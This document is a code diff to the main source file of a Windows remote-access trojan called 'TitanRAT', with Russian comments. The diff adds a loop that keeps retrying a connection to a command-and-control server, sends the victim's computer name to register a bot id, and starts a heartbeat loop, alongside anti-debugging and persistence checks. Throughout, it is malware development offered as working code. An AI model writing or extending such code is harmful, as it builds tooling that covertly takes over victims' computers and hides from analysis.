@@ -1,20 +1,14 @@
-// Core/main.cpp (Updated for Task 1.3)
-#include <windows.h>
-#include <string>
+// Core/main.cpp
+#include "network.h" // Это тянет winsock2, windows, string и Config
+#include "persistence.h"
+#include "anti_debug.h"
 #include <fstream>
 #include <cctype>
-#include "persistence.h"
-#include "anti_debug.h"  // Task 1.3: anti-debug module
+
+// Теперь Config уже определён через network.h
 
 constexpr unsigned long long FNV_OFFSET_BASIS = 14695981039346656037ULL;
 constexpr unsigned long long FNV_PRIME = 1099511628211ULL;
-
-struct Config {
-    std::string c2_ip;
-    int c2_port;
-    int heartbeat_interval;
-    int auto_delete_days;
-};
 
 static std::string trim(const std::string& s) {
     size_t start = s.find_first_not_of(" \t\r\n");
@@ -99,32 +93,10 @@ static unsigned long long fnv1a_hash(const char* data, size_t len) {
     return hash;
 }
 
-// Simple CLI arg check
 static bool has_arg(LPSTR cmdLine, const char* flag) {
     if (!cmdLine) return false;
     std::string cl = cmdLine;
     return cl.find(flag) != std::string::npos;
-}
-
-// Placeholder: send_result stub (to be implemented in network module)
-static void send_result(const char* data) {
-    // TODO: implement C2 response sending
-    OutputDebugStringA("[TitanRAT] send_result: ");
-    OutputDebugStringA(data);
-    OutputDebugStringA("\n");
-}
-
-// Command handler with sleep mode check (Task 1.3 integration)
-static void handle_command(const char* cmd) {
-    // Task 1.3: if in sleep mode, reject commands
-    if (g_sleepMode) {
-        send_result("SLEEP_MODE");
-        return;
-    }
-    
-    // TODO: actual command dispatch logic
-    // For now, just echo
-    send_result("OK");
 }
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
@@ -167,31 +139,51 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
         return 0;
     }
     
+    // Load Config
     Config cfg;
     if (!load_config(cfg)) {
         CloseHandle(h_mutex);
         return 1;
     }
     
-    // Task 1.3: Anti-debug check (after config, before network)
+    // Anti-debug check
     check_debugger();
     
-    // Persistence check on normal startup
+    // Persistence check
     check_persistence();
     
-    // Future: main C2 loop
-    // while(true) {
-    //     if (g_sleepMode) {
-    //         send_result("SLEEP_MODE");  // heartbeat only
-    //         Sleep(cfg.heartbeat_interval * 1000);
-    //         continue;
-    //     }
-    //     // ... receive and handle commands via handle_command() ...
-    // }
+    // Network Initialization
+    OutputDebugStringA("[TitanRAT] Initializing network...\n");
+    init_winsock();
 
-    // Demo: simulate one command handling
-    handle_command("ping");
+    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD hsize = sizeof(hostname);
+    GetComputerNameA(hostname, &hsize);
+    std::string hname(hostname);
+
+    SOCKET sock = INVALID_SOCKET;
     
+    // Connect Loop
+    while (sock == INVALID_SOCKET) {
+        OutputDebugStringA("[TitanRAT] Connecting to C2...\n");
+        sock = connect_to_server(cfg.c2_ip, cfg.c2_port);
+        if (sock == INVALID_SOCKET) {
+            OutputDebugStringA("[TitanRAT] Connection failed. Retrying in 10s...\n");
+            Sleep(10000);
+        }
+    }
+
+    // Register
+    register_with_server(sock, hname, g_bot_id);
+    
+    if (!g_bot_id.empty()) {
+        OutputDebugStringA("[TitanRAT] Entering heartbeat loop...\n");
+        heartbeat_loop(sock, cfg); // Blocks here
+    } else {
+        OutputDebugStringA("[TitanRAT] Registration failed. Exiting.\n");
+    }
+
+    cleanup_winsock();
     CloseHandle(h_mutex);
     return 0;
 }
